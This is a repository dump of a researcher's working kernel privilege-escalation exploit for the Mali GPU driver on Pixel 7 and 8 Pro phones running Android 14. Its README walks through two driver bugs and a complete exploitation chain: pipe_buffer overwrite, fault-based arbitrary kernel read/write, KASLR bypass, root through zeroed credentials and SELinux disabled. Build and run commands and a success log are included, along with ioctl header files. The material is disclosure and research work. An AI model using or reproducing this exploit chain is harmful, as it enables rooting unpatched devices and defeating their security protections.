Project Path: arc_0x36_Pixel_GPU_Exploit_hteit5iw

Source Tree:

```txt
arc_0x36_Pixel_GPU_Exploit_hteit5iw
├── README.md
├── mali.h
├── mali_base_common_kernel.h
└── poc.cpp

```

`README.md`:

```md
# Mali GPU Kernel LPE

This article provides an in-depth analysis of two kernel vulnerabilities within the Mali GPU, reachable from the default application sandbox, which I independently identified and reported to Google. It includes a kernel exploit that achieves arbitrary kernel r/w capabilities. Consequently, it disables SELinux and elevates privileges to root on Google Pixel 7 and 8 Pro models running the following Android 14 versions:
- Pixel 8 Pro: `google/husky/husky:14/UD1A.231105.004/11010374:user/release-keys`
- Pixel 7 Pro: `google/cheetah/cheetah:14/UP1A.231105.003/11010452:user/release-keys`
- Pixel 7 Pro: `google/cheetah/cheetah:14/UP1A.231005.007/10754064:user/release-keys`
- Pixel 7: `google/panther/panther:14/UP1A.231105.003/11010452:user/release-keys` (by [m4b4 (Marcel)](https://github.com/m4b4))
## Vulnerabilities
This exploit leverages two vulnerabilities: an integer overflow resulting from an incomplete patch in the `gpu_pixel_handle_buffer_liveness_update_ioctl` ioctl command, and an information leak within the timeline stream message buffers.

### Buffer Underflow in gpu_pixel_handle_buffer_liveness_update_ioctl() Due to Incorrect Integer Overflow Fix
Google addressed an integer overflow in the `gpu_pixel_handle_buffer_liveness_update_ioctl` ioctl command [in this commit](https://android.googlesource.com/kernel/google-modules/gpu/+/68073dce197709c025a520359b66ed12c5430914%5E%21/#F0). At first, when I reported this issue, I thought the bug was caused by an issue in the patch described earlier. After reviewing the report, I came to the realization that my analysis of the a vulnerability was inaccurate. Despite my first assumption of the patch being incomplete, it effectively resolves and prevents an underflow in the calculation. This lead me to suspect that the change wasn't applied in the production builds. However, although I can cause an underflow in the calculation, it is not possible to cause an overflow. This suggests that the ioctl command has been partially fixed, although not with the above patch shown above. Looking at IDA revealed that another incomplete patch was shipped in the production releases, and this patch is not present in any git branch of the mali gpu kernel module.
 
This vulnerability was first discovered in the latest Android version and reported on November 19, 2023. Google later informed me that they had already internally identified it and had assigned it [CVE-2023-48409](https://source.android.com/docs/security/bulletin/pixel/2023-12-01) in the December Android Security Bulletin, labeling it as a duplicate issue. 
Although I was able to verify that the bug had been internally identified months prior to my report, (based on the commit date around August 30) there remains confusion. Specifically, it's strange that the Security Patch Levels (SPL) for October and November of the most recent devices were still affected by this vulnerability —I haven't investigated versions prior to these. Therefore, I am unable to conclusively determine whether this was truly a duplicate issue and if the appropriate patch was indeed scheduled for December prior to my submission or if there was an oversight in addressing this vulnerability.

Anyway, what makes this bug powerful is the following:
- The buffer `info.live_ranges` is fully user-controlled.
- The overflowing values are user-controlled input, thereby, we can overflow the calculation so the `info.live_ranges` pointer can be at an arbitrary offset prior to the start of the `buff` kernel address.
- The allocation size is also user controlled input, which gives the ability to request a memory allocation from any general-purpose slab allocator.

This vulnerability shares similarities with the [DeCxt::RasterizeScaleBiasData() Buffer underflow vulnerability](https://github.com/0x36/weightBufs) I found and exploited in the iOS 15 kernel back in 2022.

### Leakage of Kernel Pointers in Timeline Stream Message Buffers
The GPU Mali implements a custom `timeline stream` designed to gather information, serialize it, and subsequently write it to a ring buffer following a specific format. Users can invoke the ioctl command `kbase_api_tlstream_acquire` to obtain a file descriptor, enabling them to read from this ring buffer. The format of the messages is as follows:
- A [packet header](https://android.googlesource.com/kernel/google-modules/gpu/+/refs/heads/android-gs-pantah-5.10-android14-qpr2-beta/mali_kbase/mali_kbase_mipe_proto.h#68)
- A [message id](https://android.googlesource.com/kernel/google-modules/gpu/+/refs/heads/android-gs-pantah-5.10-android14-qpr2-beta/mali_kbase/tl/mali_kbase_tracepoints.c#34)
- A serialized message buffer, where the specific content is contingent upon the message ID.
For example, the `__kbase_tlstream_tl_kbase_kcpuqueue_enqueue_fence_wait` function serializes the `kbase_kcpu_command_queue` and `dma_fence` kernel pointers into the message buffer, resulting in leaking kernel pointers to user space process.
```c
void __kbase_tlstream_tl_kbase_kcpuqueue_enqueue_fence_wait(
	struct kbase_tlstream *stream,
	const void *kcpu_queue,
	const void *fence
)
{
	const u32 msg_id = KBASE_TL_KBASE_KCPUQUEUE_ENQUEUE_FENCE_WAIT;
	const size_t msg_size = sizeof(msg_id) + sizeof(u64)
		+ sizeof(kcpu_queue)
		+ sizeof(fence)
		;
	char *buffer;
	unsigned long acq_flags;
	size_t pos = 0;

	buffer = kbase_tlstream_msgbuf_acquire(stream, msg_size, &acq_flags);

	pos = kbasep_serialize_bytes(buffer, pos, &msg_id, sizeof(msg_id));
	pos = kbasep_serialize_timestamp(buffer, pos);
	pos = kbasep_serialize_bytes(buffer,
		pos, &kcpu_queue, sizeof(kcpu_queue));
	pos = kbasep_serialize_bytes(buffer,
		pos, &fence, sizeof(fence));

	kbase_tlstream_msgbuf_release(stream, acq_flags);
}
```
The proof of concept exploit leaks the `kbase_kcpu_command_queue` object address by monitoring to the message id `KBASE_TL_KBASE_NEW_KCPUQUEUE` which is dispatched by the `kbasep_kcpu_queue_new` function whenever a new kcpu queue object is allocated.

Google informed me that the vulnerability was reported in March 2023 and was assigned  [CVE-2023-26083](https://source.android.com/docs/security/bulletin/2023-07-01) in their security bulletin. Nonetheless, I was able to replicate the issue on the latest Pixel devices shipped with the Security Patch Levels (SPL) for October and November, indicating that the fix had not been applied correctly or at all. Subsequently, Google quickly addressed the issue in the December Security Update Bulletin without offering credit, and later informed me that the issue was considered a duplicate. The rationale behind labeling this issue as a duplicate, however, remains questionable.

## Exploitation
---
So I have two interesting vulnerabilities. The first one offers a powerful capability to modify the content of any 16-byte aligned kernel address that comes before the allocated ~buff~ address. The second vulnerability provides hints into the potential locations of objects within the kernel memory.

### Notes on buffer_count and live_ranges_count Values
With total control over the `buffer_count` and `live_ranges_count` fields, I have the flexibility to select the target slab and the precise offset I intend to write to. However, selecting values for `buffer_count` and `live_ranges_count` requires careful consideration due to several constraints and factors:
- Both values are related, and the overflow will occur only if all the newly introduced checks are bypassed.
- The requirement for the negative offset to be 16-bytes aligned restricts the ability to write to any chosen location. However, this is generally not a significant hindrance.
- Opting for a larger offset leads to a large amount of data being written to areas of memory that may not be intended targets. For instance, if the allocation size overflows to `0x3004`, the `live_ranges` pointer would be set to `-0x4000` bytes from the `buff` object's allocated space. The `copy_from_user` function would then write `0x7004` bytes, based on the calculation of `update->live_ranges_count` times 4. Consequently, this operation would result in user-controlled data overwriting the memory area between the `live_ranges` pointer and the `buff` allocation. It is essential, therefore, to carefully ensure that no critical system objects within that range are accidentally overwritten. Given that the operation involves a `copy_from_user` call, one might consider triggering an `EFAULT` by deliberately un-mapping the undesired memory region following the user source buffer to prevent data from being written to sensitive locations. However, this approach is ineffective, that's because if the `raw_copy_from_user` function fails, it will zero out the remaining bytes in the destination kernel buffer. This behavior is implemented to ensure that in case of a partial copy due to an error, the rest of the kernel buffer does not contain uninitialized data.

```c
static inline __must_check unsigned long
_copy_from_user(void *to, const void __user *from, unsigned long n)
{
	unsigned long res = n;
	might_fault();
	if (!should_fail_usercopy() && likely(access_ok(from, n))) {
		instrument_copy_from_user(to, from, n);
		res = raw_copy_from_user(to, from, n);
	}
	if (unlikely(res))
		memset(to + (n - res), 0, res);
	return res;
}
```

Considering this, we need to carefully select the object to overwrite and the data to write.

### Choosing the Right Object to Overwrite
Because I’m stuck with this unfortunate check, my strategy is to identify an object that, if nulled out, will not produce any undesired outcome. But, before I get to that, there's another issue to deal with. Remember when I said in the last part that I can choose any allocation size and thus any general purpose slab cache allocator to service my allocation buffer? That’s not correct, because it is because of `copy_from_user` again! It is due to the [CONFIG_HARDENED_USERCOPY](https://lwn.net/Articles/693745/) mitigation. It forbids specifying a size that does not meet the corresponding slab cache size where the kernel destination buffer corresponds (in this case) of a heap object. It determines whether the buffer's page is a slab page, and if so, it retrieves the matching `kmem_cache->size` and determines whether the user supplied size will not exceed it; otherwise, the kernel just crashes due to the size mismatch. So, in other words, I cannot target objects that belong to the general purpose allocator, BUT I can still target objects that have large sizes (i.e. those served directly by the page allocator).

The first thought that came to mind was to use the `pipe_buffer` technique, which is a very elegant technique to obtain arbitrary read/write primitives. I won't go into detail about the technique, but readers are encouraged to read this fantastic blog from [Interrupt Labs](https://www.interruptlabs.co.uk/articles/pipe-buffer). When constructing a pipe object, the `pipe_buffer` object is initially created in an array of 16 elements; however, the array size can be adjusted using `fcntl(F_SETPIPE_SZ)`. Therefore, the `pipe_buffer` array allocation can be adjusted such that it can be served from the page allocator, making it a perfect target object to attack.
After selecting the pipe_buffer object as a target candidate, the next step toward achieving kernel r/w is to overwrite its content with the underflow vulnerability, which will allow me to read/write from/to any memory location whose page is overwriting the `pipe_buffer->page` field. 
Because the vulnerability allows me to write arbitrary data, I can control the whole content of '`pipe_buffer`,' including its page field, and to do so, I need to allocate the `pipe_buffer` array before the vulnerable `kbuff` object and they have to be next to each other.

### Positioning pipe_buffer and buff Objects Adjacently
I sprayed the kernel memory with a lot of `kbase_kcpu_command_queue` objects then followed by a bunch of `pipe_buffer` arrays.
I can’t just use the `pipe_buffer` arrays alone as a primary source for spraying due to the limitation imposed by `pipe_max_size`. Therefore, I decided to start spraying with the `kbase_kcpu_command_queue` object. Choosing the `kbase_kcpu_command_queue` object was for two reasons: its allocation size is `0x38C8` thus handled by the page allocator, and I can deterministically obtain its kernel address using the information kernel leak bug, making it a good object to spray with as well as a good object to target (as we’ll see in the next section).

As mentioned before, I used `fcntl(F_SETPIPE_SZ)` to increase the size of the `pipe_buffer` array allocation so that it can be served by the page allocator. To be more specific, I chose the allocation size to be a  ==0x4000 bytes (4 * PAGE_SIZE)== in order to be consistent with the `kbase_kcpu_command_queue` allocations.

### Obtaining a struct page Address
In order to properly use the `pipe_buffer`, a page address is required. Being able to identify the kernel address of a `kbase_kcpu_command_queue` object that I can deliberately create and destroy makes it a good candidate to use and finding its matching `struct page` can be achieved by using the `virt_to_page` .

### Contents to Write in the pipe_buffer  
So the `pipe_buffer` object is as follow:
```c
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};
```
As previously mentioned, the `page` field must include a valid page address. The `offset` and `len` fields must not exceed `PAGE_SIZE`, otherwise the pipe will increase the head/tail counters, resulting in the use of a new `pipe_buffer` object and loss of control over the fake pipe buffer. 
Also, the `flags` must be `PIPE_BUF_FLAG_CAN_MERGE` so the following `pipe_write` calls instead of blindly incrementing the head counter and using the next pipe buffer, it first checks whether there’s a space in the current `pipe_buffer` that will fit the write request or not, and if there is, it will simply append data to the same pipe buffer starting from the value stored at the `len` field. 
In order to avoid crashing the device at `pipe_buf_confirm`, which is called by `pipe_write` and `pipe_read`’, the `ops` pointer must also be a valid kernel address with a `ops->confirm` field set to _NULL_. I can simply use an offset within the leaked `kbase_kcpu_command_queue` object that is NULL and will not change under any circumstances.

### Choosing the Optimal Offset Value for Underflow
While the allocation sizes of the `buff` ,`kbase_kcpu_command_queue` and `pipe_buffer` are ~0x4000~ bytes, I chose to underflow the buffer with **0x8000** bytes. why ? 

Let's take a brief look at how `pipe_buffers` are updated during read and write operations. Assume we can shape the `pipe_buffer` to look like this:

```c
struct pipe_buffer {
	.page = virt_to_page(addr),
	.offset =  0,
	.len = 0x40,
	.ops = kcpu_addr + 0x50,
	.flags = PIPE_BUF_FLAG_CAN_MERGE,
	unsigned long private = 0
};
```

While the bug gives the ability to arbitrary control this content of this object, it only does so **once** because the underflowed object is freed immediately after the `ioctl` call finishes. This actually poses a problem because I need to manually update the `pipe_buffer` object to make it useable again since each pipe read/write operation:
- The `.page` field is not updated; it remains the same, and when the buffer is empty, it is released, which I do not want to happen because the `.ops` field is not correctly set. 
- Because the `pipe_buffer` updates the `.offset` field on a read operation, therefore, I cannot read the same memory region again. 
- The data written to the `pipe_buffer` will be appended to the buffer starting from the `.len` value (assuming that `PIPE_BUF_FLAG_CAN_MERGE` flag is set) and the `.len` is updated accordingly. That is, we can't write data into the exact address twice. 

As a result, unless I properly update the `pipe_buffer` after each read or write operation, I cannot read and write from/to the same pipe at the same time. That's why underflowing with `0x8000` bytes is much more practical, because instead of overwriting a single `pipe_buffer`, **I'll overwrite two distinct pipe_buffer instances of two distinct pipes objects: one for will be considered for read and the other for write operations**.

```c
#define PIPE_BUF_FLAG_CAN_MERGE	0x10	/* can merge buffers */

pipe_read = (struct pipe_buffer *)( ptr);
pipe_read->page = virt_to_page(ta->kcpu_kaddr);
pipe_read->offset = 0;
pipe_read->len = 0xfff;
pipe_read->ops = (const void *)(ta->kcpu_kaddr + 0x50);
pipe_read->flags = PIPE_BUF_FLAG_CAN_MERGE;
pipe_read->private = 0;

pipe_write = (struct pipe_buffer *)( ptr + 0x4000);
pipe_write->page = virt_to_page(ta->kcpu_kaddr);
pipe_write->offset = 0;
pipe_write->len = 0;             /* This is the starting position of the pipe_write */
pipe_write->ops = (const void *)(ta->kcpu_kaddr + 0x50);
pipe_write->flags = PIPE_BUF_FLAG_CAN_MERGE;
pipe_write->private = 0;
```

The `pipe_read` is a fake pipe buffer that will be used for reading data from the target page starting at `.offset = 0` up to `0xfff` bytes, whereas `pipe_write` is a fake `pipe_buffer` that will be used for writing data starting from `.len = 0` up to `0xfff` bytes. 
It's also very important to mention again that writing more than `PAGE_SIZE` bytes will push the pipe to increment the head counter, therefore using a fresh newly allocated `pipe_buffer` and losing control over our fake `pipe_write`. In the other hand, emptying (reading 0xfff data from) `fake_read` buffer tells the kernel to release the actual page by calling `ops→release` causing the kernel to crash because I still don’t have a kernel text address. 
Although I managed to segregate the pipe read and write operations so that performing a write in one pipe end will not interfere with the other pipe buffer and vice versa, I still haven’t solved the core issue: How to reliably update the pipe buffer? The obvious answer came to mind was just to repeat the spray process again and again after each pipe read or write call.  And this makes no sense because it would have had a significant impact on exploit reliability. In the following section, I will divide the goal into two sub-goals: to begin, I'll focus on the `.page` field only, followed by the `.len/.offset` fields afterward. 

### Modifying the pipe_buffer→page Field
To my surprise, I don't have or need to update the `.page` at all, that's because I can overwrite the `pipe_buffer→page`  to point to the page address of the leaked `kbase_kcpu_command_queue`.  Therefore, **All I need to do is release the `kbase_kcpu_command_queue` object and overlap it with a new `pipe_buffer` object. Yup! Now I have a `pipe_buffer→page` that points to a legitimate `pipe_buffer` object!
Replacing `kbase_kcpu_command_queue` with `pipe_buffer` gives us the ability to manipulate a legitimate pipe buffer without regularly having to update the `.page` field. However, I still have to deal with the `.len` and `.offset` fields.

### Modifying the pipe_buffer→len/offset Fields
As I've mentioned earlier, doing pipe read/write updates the `.len` and `.offset` fields, rendering subsequent read/write operations on the same page unusable, even if performed over the two distinct pipes. Here's another trick: **there's a technique to read/write data without even touching the `.len/.offset` fields!**.  And it is possible to achieve this by faulting `copy_page_from_iter` and `copy_page_to_iter` calls on `pipe_read/write`! Yes, just like `copy_to/from_user`, `copy_page_to/from_iter` copies data from/to user-space that is passed through the `iov_iter` structure, and it can be faulted. 

To continue with the previous example, if we wish to write 8 bytes of data to an address, the provided user space buffer size must be 8, followed by an unmapped or non-readable area of memory, and then pass `9` as a size argument to the `write` system call, indicating the amount of data that we want to write.This operation will write 8 bytes and fail on the _ninth_ because it encounters an unmapped/unread memory location. As a result, the data has been effectively written to the destination kernel buffer and the`.len` field has not been modified. The `pipe_write` kernel function will just return without updating the `buf->len` field.

```c
		if ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) &&
		    offset + chars <= PAGE_SIZE) {
			ret = pipe_buf_confirm(pipe, buf);
			if (ret)
				goto out;

			ret = copy_page_from_iter(buf->page, offset, chars, from);
			if (unlikely(ret < chars)) {
				ret = -EFAULT;
				goto out;
			}

			buf->len += ret;
			if (!iov_iter_count(from))
				goto out;
		}
```
The same is true for read operations; if we wish to read 8 bytes, make the ninth byte of the buffer unreadable then just claim that we want to read 9 bytes, the data will be copied to the user buffer without changing the `.offset` field. 
As a result, we are able to perform unlimited read/write operations on any kernel memory address without having to recurrently go through the spray process.

### Getting root
Now that I have a strong arbitrary read/write primitive, I just looked through all the `struct page` in the `VMEMMAP_START` array to determine the kernel text starting address using the technique outlined in the [Interrupt Labs](https://www.interruptlabs.co.uk/articles/pipe-buffer) blog post. Then I realized that `init_task` is nulled out in _Android November Security Updates_, so I just used `kthreadd_task` instead. Having `kthreadd_task` kernel address allowed me to walk the `task->tasks` list and obtain my own `current` task kernel address, then zero out the `cred` structure to achieve root privileges.

Later, I realized scanning all the page addresses was unnecessary because I already had the anon_pipe_buf_ops kernel text address from a pipe_buffer object. With this information, I could deduce the kernel text base address, effectively bypassing KASLR.

### Disable SELinux
The exploit disables SELinux also, with the kernel text base address, I just need to find the `selinux_state` global structure location and then zero out the `.enforcing` value.

## Proof of Concept
The proof of concept accompanying the report was tested on Pixel 7 and 8 Pro devices running Android 14 with the October and November ASBs, achieving a success rate of nearly 100%.
It's also important to mention that the exploit will not work out of the box in other devices due to the use of some hardcoded offsets. In order to add support for a new device, one must have to provide the following:
- `kthreadd_task` offset from the kernel base address.
- `selinux_state` offset from the kernel base address.
- `task_struct->cred` , `task_struct->pid` and `task_struct->tasks` structure offsets.
- `anon_pipe_buf_ops` offset from the kernel base address.

### Compilation 
To compile the exploit as a standalone binary use the following command, then use `adb shell` to run it:
```sh
$ aarch64-linux-androidXX-clang++ -static-libstdc++ -w -Wno-c++11-narrowing -DUSE_STANDALONE -o poc poc.cpp -llog
$ adb push poc /data/local/tmp/
$ adb shell /data/local/tmp/poc
```
You can also run the exploit via an Android Studio App by embeding this directory with it and make sure to disable the useless C++ warnings by adding `-w -Wno-c++11-narrowing` to the cmake file.

### Demo
```shell
$ adb logcat  |grep -i EXPLOIT
11-28 16:04:12.500  7989  7989 E EXPLOIT : [+] Target device: 'google/husky/husky:14/UD1A.231105.004/11010374:user/release-keys' 0xa9027bfdd10203ff 0xa90467faa9036ffc
11-28 16:04:15.563  7989  7989 E EXPLOIT : [+] Got the kcpu_id (0) kernel address = 0xffffff8901390000  from context (0x0)
11-28 16:04:18.441  7989  7989 E EXPLOIT : [+] Got the kcpu_id (255) kernel address = 0xffffff89b0bf8000  from context (0xff)
11-28 16:04:18.442  7989  7989 E EXPLOIT : [+] Found corrupted pipe with size 0xfff
11-28 16:04:18.442  7989  7989 E EXPLOIT : [+] SUCCESS! we have a fake pipe_buffer (0)!
11-28 16:04:18.444  7989  7989 E EXPLOIT : 10 00 39 01 89 FF FF FF  10 00 39 01 89 FF FF FF  | ..9.......9.....
11-28 16:04:18.444  7989  7989 E EXPLOIT : 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  | ................
11-28 16:04:18.444  7989  7989 E EXPLOIT : 00 B0 CD 12 C0 FF FF FF  00 00 00 00 00 00 00 00  | ................
11-28 16:04:18.444  7989  7989 E EXPLOIT : 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  | ................
11-28 16:04:18.445  7989  7989 E EXPLOIT : [+] Freeing kcpu_id = 0 (0xffffff8901390000)
11-28 16:04:18.446  7989  7989 E EXPLOIT : [+] Allocating 61 pipes with 256 slots
11-28 16:04:18.462  7989  7989 E EXPLOIT : [+] Successfully overlapped the kcpuqueue object with a pipe buffer
11-28 16:04:18.463  7989  7989 E EXPLOIT : 40 AB BA 26 FE FF FF FF  00 00 00 00 30 00 00 00  | @..&........0...
11-28 16:04:18.463  7989  7989 E EXPLOIT : 70 37 8D F1 DA FF FF FF  10 00 00 00 00 00 00 00  | p7..............
11-28 16:04:18.463  7989  7989 E EXPLOIT : 00 00 00 00 00 00 00 00                           | ........
11-28 16:04:18.463  7989  7989 E EXPLOIT : [+] pipe_buffer {.page = 0xfffffffe26baab40, .offset = 0x0, .len = 0x30, ops = 0xffffffdaf18d3770}
11-28 16:04:18.463  7989  7989 E EXPLOIT : [+] kernel base = 0xffffffdaf0010000, kthreadd_task = 0xffffff8002da3780 selinux_state = 0xffffffdaf28a3168
11-28 16:04:20.097  7989  7989 E EXPLOIT : [+] Found our own task struct 0xffffff88416c5c80
11-28 16:04:20.097  7989  7989 E EXPLOIT : [+] Successfully got root: getuid() = 0 getgid() = 0
11-28 16:04:20.097  7989  7989 E EXPLOIT : [+] Successfully disabled SELinux
11-28 16:04:20.102  7989  7989 E EXPLOIT : [+] Cleanup  ... OK
```

	
```

`mali.h`:

```h
#ifndef _H_MALI_H
#define _H_MALI_H

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <errno.h>
#include <inttypes.h>
#include <limits.h>
#include <fcntl.h>
#include <linux/memfd.h>
#include <linux/types.h>
#include <sys/epoll.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>
#include <assert.h>
#include <sched.h>
#include <sys/resource.h>
#include <pthread.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <android/log.h>
#include <sys/klog.h>
#include <syslog.h>
#include <ctype.h>
#include <sys/system_properties.h>

#include "mali_base_common_kernel.h"
typedef __u32 base_mem_alloc_flags;

#define KBASE_API_VERSION(major, minor) ((((major) & 0xFFF) << 20)  |   \
                                         (((minor) & 0xFFF) << 8) |     \
                                         ((0 & 0xFF) << 0))

#define KBASE_API_MIN(api_version) ((api_version >> 8) & 0xFFF)
#define KBASE_API_MAJ(api_version) ((api_version >> 20) & 0xFFF)

#define KBASE_IOCTL_TYPE 0x80

struct kbase_ioctl_version_check {
        __u16 major;
        __u16 minor;
};

#define KBASE_IOCTL_VERSION_CHECK                                       \
        _IOWR(KBASE_IOCTL_TYPE, 52, struct kbase_ioctl_version_check)


struct kbase_ioctl_set_flags {
        __u32 create_flags;
};

#define KBASE_IOCTL_SET_FLAGS                                   \
        _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)

struct kbase_ioctl_cs_queue_register {
        __u64 buffer_gpu_addr;
        __u32 buffer_size;
        __u8 priority;
        __u8 padding[3];
};

#define KBASE_IOCTL_CS_QUEUE_REGISTER                                   \
        _IOW(KBASE_IOCTL_TYPE, 36, struct kbase_ioctl_cs_queue_register)

union kbase_ioctl_mem_alloc {
        struct {
                __u64 va_pages;
                __u64 commit_pages;
                __u64 extension;
                __u64 flags;
        } in;
        struct {
                __u64 flags;
                __u64 gpu_va;
        } out;
};

#define KBASE_IOCTL_MEM_ALLOC                                   \
        _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)

#endif /* _H_MALI_H */

union kbase_ioctl_cs_queue_bind {
        struct {
                __u64 buffer_gpu_addr;
                __u8 group_handle;
                __u8 csi_index;
                __u8 padding[6];
        } in;
        struct {
                __u64 mmap_handle;
        } out;
};

#define KBASE_IOCTL_CS_QUEUE_BIND                                       \
        _IOWR(KBASE_IOCTL_TYPE, 39, union kbase_ioctl_cs_queue_bind)

union kbase_ioctl_cs_queue_group_create {
        struct {
                __u64 tiler_mask;
                __u64 fragment_mask;
                __u64 compute_mask;
                __u8 cs_min;
                __u8 priority;
                __u8 tiler_max;
                __u8 fragment_max;
                __u8 compute_max;
                __u8 csi_handlers;
                __u8 padding[2];
                /**
                 * @in.reserved: Reserved
                 */
                __u64 reserved;
        } in;
        struct {
                __u8 group_handle;
                __u8 padding[3];
                __u32 group_uid;
        } out;
};

#define KBASE_IOCTL_CS_QUEUE_GROUP_CREATE                               \
        _IOWR(KBASE_IOCTL_TYPE, 58, union kbase_ioctl_cs_queue_group_create)



struct kbase_ioctl_cs_cpu_queue_info {
        __u64 buffer;
        __u64 size;
};

#define KBASE_IOCTL_CS_CPU_QUEUE_DUMP                                   \
        _IOW(KBASE_IOCTL_TYPE, 53, struct kbase_ioctl_cs_cpu_queue_info)

typedef __u8 base_kcpu_queue_id;
struct kbase_ioctl_kcpu_queue_new {
        base_kcpu_queue_id id;
        __u8 padding[7];
};
#define KBASE_IOCTL_KCPU_QUEUE_CREATE                                   \
        _IOR(KBASE_IOCTL_TYPE, 45, struct kbase_ioctl_kcpu_queue_new)


/* Enable KBase tracepoints for CSF builds */
#define BASE_TLSTREAM_ENABLE_CSF_TRACEPOINTS (1 << 2)

struct kbase_ioctl_tlstream_acquire {
        __u32 flags;
};

#define KBASE_IOCTL_TLSTREAM_ACQUIRE                                    \
        _IOW(KBASE_IOCTL_TYPE, 18, struct kbase_ioctl_tlstream_acquire)

struct kbase_pixel_gpu_slc_liveness_mark {
        __u32 type : 1;
        __u32 index : 31;
};
struct kbase_ioctl_buffer_liveness_update {
        __u64 live_ranges_address;
        __u64 live_ranges_count;
        __u64 buffer_va_address;
        __u64 buffer_sizes_address;
        __u64 buffer_count;
};

#define KBASE_IOCTL_BUFFER_LIVENESS_UPDATE                              \
        _IOW(KBASE_IOCTL_TYPE, 67, struct kbase_ioctl_buffer_liveness_update)

typedef __u8 base_kcpu_queue_id;

struct kbase_ioctl_kcpu_queue_delete {
        base_kcpu_queue_id id;
        __u8 padding[7];
};

#define KBASE_IOCTL_KCPU_QUEUE_DELETE                                   \
        _IOW(KBASE_IOCTL_TYPE, 46, struct kbase_ioctl_kcpu_queue_delete)

struct kbase_ioctl_get_context_id {
        __u32 id;
};

#define KBASE_IOCTL_GET_CONTEXT_ID _IOR(KBASE_IOCTL_TYPE, 17, struct kbase_ioctl_get_context_id)

```

`mali_base_common_kernel.h`:

```h
/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/*
 *
 * (C) COPYRIGHT 2022 ARM Limited. All rights reserved.
 *
 * This program is free software and is provided to you under the terms of the
 * GNU General Public License version 2 as published by the Free Software
 * Foundation, and any use by you of this program is subject to the terms
 * of such GNU license.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, you can access it online at
 * http://www.gnu.org/licenses/gpl-2.0.html.
 *
 */

#ifndef _UAPI_BASE_COMMON_KERNEL_H_
#define _UAPI_BASE_COMMON_KERNEL_H_

#include <linux/types.h>

struct base_mem_handle {
	struct {
		__u64 handle;
	} basep;
};

#define BASE_GPU_NUM_TEXTURE_FEATURES_REGISTERS 4

/* Memory allocation, access/hint flags & mask.
 *
 * See base_mem_alloc_flags.
 */

/* IN */
/* Read access CPU side
 */
#define BASE_MEM_PROT_CPU_RD ((base_mem_alloc_flags)1 << 0)

/* Write access CPU side
 */
#define BASE_MEM_PROT_CPU_WR ((base_mem_alloc_flags)1 << 1)

/* Read access GPU side
 */
#define BASE_MEM_PROT_GPU_RD ((base_mem_alloc_flags)1 << 2)

/* Write access GPU side
 */
#define BASE_MEM_PROT_GPU_WR ((base_mem_alloc_flags)1 << 3)

/* Execute allowed on the GPU side
 */
#define BASE_MEM_PROT_GPU_EX ((base_mem_alloc_flags)1 << 4)

/* Will be permanently mapped in kernel space.
 * Flag is only allowed on allocations originating from kbase.
 */
#define BASEP_MEM_PERMANENT_KERNEL_MAPPING ((base_mem_alloc_flags)1 << 5)

/* The allocation will completely reside within the same 4GB chunk in the GPU
 * virtual space.
 * Since this flag is primarily required only for the TLS memory which will
 * not be used to contain executable code and also not used for Tiler heap,
 * it can't be used along with BASE_MEM_PROT_GPU_EX and TILER_ALIGN_TOP flags.
 */
#define BASE_MEM_GPU_VA_SAME_4GB_PAGE ((base_mem_alloc_flags)1 << 6)

/* Userspace is not allowed to free this memory.
 * Flag is only allowed on allocations originating from kbase.
 */
#define BASEP_MEM_NO_USER_FREE ((base_mem_alloc_flags)1 << 7)

/* Grow backing store on GPU Page Fault
 */
#define BASE_MEM_GROW_ON_GPF ((base_mem_alloc_flags)1 << 9)

/* Page coherence Outer shareable, if available
 */
#define BASE_MEM_COHERENT_SYSTEM ((base_mem_alloc_flags)1 << 10)

/* Page coherence Inner shareable
 */
#define BASE_MEM_COHERENT_LOCAL ((base_mem_alloc_flags)1 << 11)

/* IN/OUT */
/* Should be cached on the CPU, returned if actually cached
 */
#define BASE_MEM_CACHED_CPU ((base_mem_alloc_flags)1 << 12)

/* IN/OUT */
/* Must have same VA on both the GPU and the CPU
 */
#define BASE_MEM_SAME_VA ((base_mem_alloc_flags)1 << 13)

/* OUT */
/* Must call mmap to acquire a GPU address for the allocation
 */
#define BASE_MEM_NEED_MMAP ((base_mem_alloc_flags)1 << 14)

/* IN */
/* Page coherence Outer shareable, required.
 */
#define BASE_MEM_COHERENT_SYSTEM_REQUIRED ((base_mem_alloc_flags)1 << 15)

/* Protected memory
 */
#define BASE_MEM_PROTECTED ((base_mem_alloc_flags)1 << 16)

/* Not needed physical memory
 */
#define BASE_MEM_DONT_NEED ((base_mem_alloc_flags)1 << 17)

/* Must use shared CPU/GPU zone (SAME_VA zone) but doesn't require the
 * addresses to be the same
 */
#define BASE_MEM_IMPORT_SHARED ((base_mem_alloc_flags)1 << 18)

/* Should be uncached on the GPU, will work only for GPUs using AARCH64 mmu
 * mode. Some components within the GPU might only be able to access memory
 * that is GPU cacheable. Refer to the specific GPU implementation for more
 * details. The 3 shareability flags will be ignored for GPU uncached memory.
 * If used while importing USER_BUFFER type memory, then the import will fail
 * if the memory is not aligned to GPU and CPU cache line width.
 */
#define BASE_MEM_UNCACHED_GPU ((base_mem_alloc_flags)1 << 21)

/*
 * Bits [22:25] for group_id (0~15).
 *
 * base_mem_group_id_set() should be used to pack a memory group ID into a
 * base_mem_alloc_flags value instead of accessing the bits directly.
 * base_mem_group_id_get() should be used to extract the memory group ID from
 * a base_mem_alloc_flags value.
 */
#define BASEP_MEM_GROUP_ID_SHIFT 22
#define BASE_MEM_GROUP_ID_MASK ((base_mem_alloc_flags)0xF << BASEP_MEM_GROUP_ID_SHIFT)
